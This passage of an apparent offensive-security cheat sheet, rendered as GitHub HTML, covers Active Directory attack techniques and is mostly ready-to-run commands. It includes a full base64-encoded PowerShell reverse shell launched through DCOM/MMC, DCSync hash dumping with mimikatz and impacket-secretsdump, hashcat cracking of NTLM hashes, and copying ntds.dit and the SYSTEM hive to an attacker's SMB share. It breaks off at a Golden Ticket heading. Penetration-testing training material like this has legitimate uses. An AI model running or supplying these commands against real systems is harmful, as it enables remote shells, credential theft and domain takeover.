class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e/USERNAME.ccache\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use with crackmapexec, impacket-psexec/wmiexec/smbexec\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make sure you set /etc/hosts to reslove FQDN for crackmapexec\u003c/span\u003e\ncrackmapexec smb --use-kcache VICTIM_FQDN\nimpacket-psexec -k -no-pass VICTIM_FQDN\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.3.5 DCOM\u003c/h3\u003e\u003ca id=\"user-content-535-dcom\" class=\"anchor\" aria-label=\"Permalink: 5.3.5 DCOM\" href=\"#535-dcom\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDetailed first writeup by \u003ca href=\"https://www.cybereason.com/blog/dcom-lateral-movement-techniques\" rel=\"nofollow\"\u003ecybereason\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eMicrosoft's \u003cem\u003eComponent Object Model (COM)\u003c/em\u003e allows software interaction between processes, and \u003cem\u003eDistributed Component Object Model (DCOM)\u003c/em\u003e extends COM to allow process interaction on remote hosts.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eBoth COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local \u003cstrong\u003eadministrator access is required\u003c/strong\u003e to call the DCOM Service Control Manager, which is essentially an API.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe following DCOM lateral movement technique is based on the \u003cem\u003eMicrosoft Management Console (MMC)\u003c/em\u003e COM application that is employed for scripted automation of Windows systems. The MMC Application Class allows the creation of Application Objects, which expose the \u003ccode\u003eExecuteShellCommand\u003c/code\u003e method under the \u003ccode\u003eDocument.ActiveView\u003c/code\u003e property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eLeveraging DCOM to get a reverse shell on a remote machine:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# variable declaration\n$victim = 'VICTIM' # hostname or IP\n$lhost = 'LISTEN_IP'\n$lport = 443\n$revshell = '$client=New-Object System.Net.Sockets.TCPClient(\u0026quot;'+$lhost+'\u0026quot;,'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2\u0026gt;\u0026amp;1|Out-String );$sendback2=$sendback+\u0026quot;PS \u0026quot;+(pwd).Path+\u0026quot;\u0026gt;\u0026quot;;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';\n$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));\n$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;\n# create the DCOM MMC object for the remote machine\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\u0026quot;MMC20.Application.1\u0026quot;,$victim))\n# execute shell command through DCOM object\n$dcom.Document.ActiveView.ExecuteShellCommand(\u0026quot;powershell\u0026quot;,$null,$command,\u0026quot;7\u0026quot;)\n# ExecuteShellCommand accepts 4 parameters:\n# Command, Directory, Parameters, and WindowState (7 is hidden).\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e variable declaration\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eVICTIM\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hostname or IP\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$lhost\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$lport\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e443\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$revshell\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e$client=New-Object System.Net.Sockets.TCPClient(\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$lhost\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\",\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$lport\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e);$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2\u0026gt;\u0026amp;1|Out-String );$sendback2=$sendback+\"PS \"+(pwd).Path+\"\u0026gt;\";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$b64cmd\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-k\"\u003eConvert\u003c/span\u003e]::ToBase64String([\u003cspan class=\"pl-k\"\u003eSystem.Text.Encoding\u003c/span\u003e]::Unicode.GetBytes(\u003cspan class=\"pl-smi\"\u003e$revshell\u003c/span\u003e));\n\u003cspan class=\"pl-smi\"\u003e$command\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003epowershell -ep bypass -nop -w hidden -enc \u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$b64cmd\u003c/span\u003e;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create the DCOM MMC object for the remote machine\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$dcom\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-k\"\u003eSystem.Activator\u003c/span\u003e]::CreateInstance([\u003cspan class=\"pl-k\"\u003etype\u003c/span\u003e]::GetTypeFromProgID(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eMMC20.Application.1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e))\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e execute shell command through DCOM object\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$dcom\u003cspan class=\"pl-smi\"\u003e.Document.ActiveView.ExecuteShellCommand\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epowershell\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$command\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e7\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ExecuteShellCommand accepts 4 parameters:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Command, Directory, Parameters, and WindowState (7 is hidden).\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.4 Active Directory Persistence\u003c/h2\u003e\u003ca id=\"user-content-54-active-directory-persistence\" class=\"anchor\" aria-label=\"Permalink: 5.4 Active Directory Persistence\" href=\"#54-active-directory-persistence\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.4.1 Domain Controller Synchronization (DCSync)\u003c/h3\u003e\u003ca id=\"user-content-541-domain-controller-synchronization-dcsync\" class=\"anchor\" aria-label=\"Permalink: 5.4.1 Domain Controller Synchronization (DCSync)\" href=\"#541-domain-controller-synchronization-dcsync\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDCSync lets you remotely dump the hashes from a domain controller's \u003ccode\u003entds.dit\u003c/code\u003e file.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWhen multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using \u003ccode\u003eIDL_DRSGetNCChanges\u003c/code\u003e API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo launch such a replication, a user needs to have the \u003cem\u003eReplicating Directory Changes\u003c/em\u003e, \u003cem\u003eReplicating Directory Changes All\u003c/em\u003e, and \u003cem\u003eReplicating Directory Changes in Filtered Set\u003c/em\u003e rights. By default, members of the \u003cem\u003eDomain Admins\u003c/em\u003e, \u003cem\u003eEnterprise Admins\u003c/em\u003e, and \u003cem\u003eAdministrators\u003c/em\u003e groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePerforming dcsync attack:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# From inside mimikatz shell\n# grab all hashes from DC\nlsadump::dcsync\n# grab hashes of specific user\nlsadump::dcsync /user:corp\\Administrator\n\n# Kali: use impacket\n# full dump of hashes\n# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)\nimpacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP\n# grab specific user's hashes\nimpacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e From inside mimikatz shell\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab all hashes from DC\u003c/span\u003e\nlsadump::dcsync\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab hashes of specific user\u003c/span\u003e\nlsadump::dcsync \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:corp\\Administrator\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: use impacket\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e full dump of hashes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esecretsdump \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ejust\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edc \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutputfile dcsync DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eADMINUSER:PASSWORD\u003cspan class=\"pl-smi\"\u003e@DC_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab specific user's hashes\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esecretsdump \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ejust\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edc\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euser \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutputfile dcsync USER DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eADMINUSER:PASSWORD\u003cspan class=\"pl-smi\"\u003e@DC_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCrack dumped NTLM hashes:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\" hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt\"\u003e\u003cpre\u003e hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.4.2 Volume Shadow Copy\u003c/h3\u003e\u003ca id=\"user-content-542-volume-shadow-copy\" class=\"anchor\" aria-label=\"Permalink: 5.4.2 Volume Shadow Copy\" href=\"#542-volume-shadow-copy\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDomain Admins can abuse shadow copies to obtain a copy of the \u003ccode\u003entds.dit\u003c/code\u003e file (the Active Directory database, containing all user credentials).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eA Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. Shadow copies are managed by the binary \u003ccode\u003evshadow.exe\u003c/code\u003e, part of the Windows SDK. They can also be created using WMI.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# from elevated terminal session:\n\n# create volume shadow copy of C: drive\n# -nw : no writers (to speed up creation)\n# -p : store copy on disk\nvshadow.exe -nw -p  C:\n# pay attention to Shadow copy device name\n# line under * SNAPSHOT ID = {UUID}\n#    - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n\n# create SMB session with hacker machine\nnet use \\\\ATTACKER_IP herpderp /user:derp\n\n# copy the ntds.dit file over to attacker machine (must do in cmd, not PS)\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit \\\\ATTACKER_IP\\share\\ntds.dit.bak\n\n# save copy of SYSTEM registry hive onto attacker machine\n# this contains the encryption keys for the ntds.dit file\nreg.exe save hklm\\system \\\\ATTACKER_IP\\share\\system.hiv\n\n# on Kali, use secretsdump to extract hashes\nimpacket-secretsdump -ntds ntds.dit.bak -system system.hiv -outputfile ntds-dump LOCAL\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e from elevated terminal session:\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create volume shadow copy of C: drive\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -nw : no writers (to speed up creation)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -p : store copy on disk\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003evshadow.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003enw \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep  C:\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e pay attention to Shadow copy device name\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e line under * SNAPSHOT ID = {UUID}\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e    - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create SMB session with hacker machine\u003c/span\u003e\nnet use \\\\ATTACKER_IP herpderp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:derp\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e copy the ntds.dit file over to attacker machine (must do in cmd, not PS)\u003c/span\u003e\ncopy \\\\\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit \\\\ATTACKER_IP\\share\\ntds.dit.bak\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e save copy of SYSTEM registry hive onto attacker machine\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e this contains the encryption keys for the ntds.dit file\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ereg.exe\u003c/span\u003e save hklm\\system \\\\ATTACKER_IP\\share\\system.hiv\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on Kali, use secretsdump to extract hashes\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esecretsdump \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003entds ntds.dit.bak \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esystem system.hiv \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eoutputfile ntds\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edump LOCAL\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternative ways to create shadow copies, plus ways of working with them:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create shadow copy with wmic:\nwmic shadowcopy call create volume=c:\\\n\n# create with PowerShell\n([WMICLASS]\u0026quot;root\\cimv2:win32_shadowcopy\u0026quot;).create(\u0026quot;C:\\\u0026quot;,\u0026quot;ClientAccessible\u0026quot;)\n\n# list all volume shadow copies for C: drive\nvssadmin list shadows /for=C:\n\n# list using Powershell (shows date created)\nGet-CimInstance Win32_ShadowCopy | select Name,Caption,Description,ServiceMachine,InstallDate,ID,DeviceObject\n\n# if you want to browse the files in the shadow copy, mount it:\n# Note the trailing slash at the end of the shadow copy device name's path!\nmklink /D C:\\users\\Public\\stuff SHADOWCOPYDEVNAME\\\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create shadow copy with wmic:\u003c/span\u003e\nwmic shadowcopy call create volume\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003ec:\\\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create with PowerShell\u003c/span\u003e\n([\u003cspan class=\"pl-k\"\u003eWMICLASS\u003c/span\u003e]\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eroot\\cimv2:win32_shadowcopy\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e).create(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\\\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eClientAccessible\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all volume shadow copies for C: drive\u003c/span\u003e\nvssadmin list shadows \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003eC:\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list using Powershell (shows date created)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CimInstance\u003c/span\u003e Win32_ShadowCopy \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select Name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eCaption\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eDescription\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eServiceMachine\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eInstallDate\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eID\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eDeviceObject\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you want to browse the files in the shadow copy, mount it:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Note the trailing slash at the end of the shadow copy device name's path!\u003c/span\u003e\nmklink \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eD C:\\users\\Public\\stuff SHADOWCOPYDEVNAME\\\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003eSecretsdump\u003c/code\u003e also supports the VSS method directly:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# perform VSS technique all in one go using secretsdump (-use-vss flag)\nimpacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e perform VSS technique all in one go using secretsdump (-use-vss flag)\u003c/span\u003e\nimpacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.4.3 Golden Ticket\u003c/h3\u003e\u003ca id=\"user-content-543-golden-ticket\" class=\"anchor\" aria-label=\"Permalink: 5.4.3 Golden Ticket\" href=\"#543-golden-ticket\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 